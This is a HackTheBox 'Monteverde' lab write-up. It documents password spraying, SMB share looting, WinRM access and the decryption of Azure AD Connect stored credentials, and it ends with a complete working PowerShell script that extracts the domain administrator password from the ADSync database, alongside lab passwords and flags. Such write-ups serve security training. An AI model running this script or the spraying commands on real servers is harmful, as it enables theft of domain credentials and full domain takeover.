
# Monteverde (HTB medium)
**Box:** Monteverde · **IP:** 10.10.10.172 · **Domain:** MEGABANK.LOCAL · **OS:** Windows Server 2019 (17763)  
**Date (lab):** 2025-10-28

---

## Executive summary
Gained initial access via password spraying and SMB file discovery; found an Azure credential in a user share; used that to log in as `mhope`. `mhope` had Azure Admin membership; local investigation found an ADSync MSSQL database with encrypted configuration blobs. After adapting a local decrypt routine, I recovered the administrator password, used it to get an admin shell, and captured `user.txt` and `root.txt`. Root cause: exposed secrets in user-accessible share and overly broad service privileges.

- Foothold: `SABatchJobs:SABatchJobs` via SMB and share enumeration.
- Escalation: ADSync config decryption to recover `Administrator` creds (`d0m@in4dminyeah!`).
- Impact: full host and domain-level control; database-hosted secrets accessible.

---

## Attack chain summary
1. Recon - nmap and user enumeration.
2. Password spraying; found `SABatchJobs:SABatchJobs`.
3. SMB enumeration; downloaded `mhope/azure.xml` showing `4n0therD4y@n0th3r$`.
4. WinRM to `mhope`; confirmed `mhope` in Azure Admins.
5. Host enumeration; found MSSQL instance and ADSync DB.
6. Ran ADSync decrypt routine locally; recovered admin credentials.
7. WinRM to Administrator; captured `root.txt`.

---

## Technical breakdown

### Recon and foothold
```bash
sudo nmap -sC -sV -oN logs/nmap.init 10.10.10.172
enum4linux-ng -U 10.10.10.172 | grep "username:" | awk '{ print $2 }' > user.list
# Password policy indicated no lockout threshold; minimal complexity required.
netexec smb 10.10.10.172 -u user.list -p pass.list
# Found MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

SMB file extraction:
```bash
smbclient //10.10.10.172/users$ -U 'SABatchJobs%SABatchJobs'
recurse ON
prompt OFF
mget *
# saved mhope/azure.xml
```

`mhope/azure.xml` snippet:
```xml
<Objs ...>
  <Props>
    <S N="Password">4n0therD4y@n0th3r$</S>
  </Props>
</Objs>
```

### Lateral to mhope and host enumeration
```bash
netexec winrm 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
# evil-winrm shell, user flag obtained: b9a355bd318db6299e9d1135b1391cd4
```

Checked group membership; `mhope` is in Azure Admins. Ran winPEAS and basic MSSQL enumeration:
```powershell
sqlcmd -Q "select name, create_date from sys.databases"
# saw ADSync database
```

### ADSync extraction and decryption
ADSync stores encrypted configuration in `mms_management_agent`. Key data pulled:
```sql
USE ADSync;
SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD';
SELECT keyset_id, instance_id, entropy FROM mms_server_configuration;
```

The decrypt routine requires access to the local AD Sync mcrypt DLL and local key material. Under an interactive local session the adapted script printed the domain, username and password:
```
Username: Administrator
Password: d0m@in4dminyeah!
```

Notes: the original PoC concept is from xpnsec; I adapted the connection string so it works under the evil-winrm context when run on the target host interactively.

### Admin takeover
```bash
evil-winrm-py -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'
# admin shell, root flag: ce0899bf0e75ac4ced4945bd00e6613b
```

---

## Key findings and remediation summary
- Exposed secret in user share; rotate and remove such files immediately.
- Audit and reduce membership in privileged groups such as Azure Admins.
- Review ADSync access controls; protect or remove local decryption keys and restrict who can access the ADSync server context.
- Revoke and rotate service principals and stored credentials that are not following least privilege.

---

## Evidence and artifacts
- user.txt: `b9a355bd318db6299e9d1135b1391cd4`
- root.txt: `ce0899bf0e75ac4ced4945bd00e6613b`
- `mhope/azure.xml` saved copy; ADSync blobs and adapted `decrypt.ps1` stored in raw archive only.

---

## Reflection
This box rewarded quiet, careful follow-up; the azure credential in a user share was a clear human mistake. The ADSync route is a solid reminder that cloud-on-prem bridges are high value; when they store secrets locally, they become attack vectors. I spent time adapting the decrypt script and learned a couple of PowerShell quirks that were worth the time.

---

## Cleaned decrypt.ps1 (adapted from xpnsec writeup)
Place this on the target and run it in an interactive PowerShell session on the host. It expects the AD Connect mcrypt DLL to exist at the standard path; run it as a local user with permission to load that assembly.

```powershell
# AD Connect Sync credential extract POC - adapted version
# Derived from the xpnsec writeup; adapted connection string for local instance and annotated.
# Usage: run interactively on the target host in PowerShell
# Note: evil-winrm and other non-standard shells can swallow output; use Write-Host to force console output.

Write-Host "AD Connect Sync Credential Extract POC (adapted) `n"

# Use local integrated security and the ADSync database
$connectionString = "Server=localhost; Integrated Security=true; Initial Catalog=ADSync"
$client = New-Object System.Data.SqlClient.SqlConnection -ArgumentList $connectionString

try {
    $client.Open()
} catch {
    Write-Host "Failed to open SQL connection; check instance and permissions."
    throw
}

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

# load the mcrypt assembly from AD Connect install path
$assemblyPath = 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
if (-Not (Test-Path $assemblyPath)) {
    Write-Host "mcrypt.dll not found at expected path: $assemblyPath"
    throw
}
Add-Type -Path $assemblyPath

# KeyManager object and key loading
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)

# Get fallback key; decrypt the base64 blob
$key2 = $null
$km.GetKey(1, [ref]$key2)

$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

# parse XML to pull username and password
$domain = Select-Xml -Content $config -XPath "//parameter[@name='forest-login-domain']" 2>$null | Select @{Name='Domain'; Expression={$_.Node.InnerXML}} 
$username = Select-Xml -Content $config -XPath "//parameter[@name='forest-login-user']" | Select @{Name='Username'; Expression={$_.Node.InnerXML}}
$password = Select-Xml -Content $decrypted -XPath "//attribute" | Select @{Name='Password'; Expression={$_.Node.InnerText}}

# Force output to console; some shells need explicit Write-Host
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```
